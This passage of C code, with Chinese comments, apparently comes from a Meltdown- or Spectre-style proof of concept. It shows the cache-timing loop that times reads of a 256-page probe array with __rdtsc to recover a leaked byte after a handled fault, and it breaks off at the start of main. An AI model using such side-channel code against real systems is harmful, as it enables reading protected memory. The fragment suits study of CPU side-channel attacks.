        // 异常处理后，检查probe缓存状态
        for (i = 0; i < 256; i++) {
            uint64_t start = __rdtsc();
            volatile int tmp = probe[i * 4096];
            uint64_t end = __rdtsc();
            if (end - start < 100) {
                return (char)i; // 返回猜测的字节
            }
        }
    }
    return 0;
}

int main() {
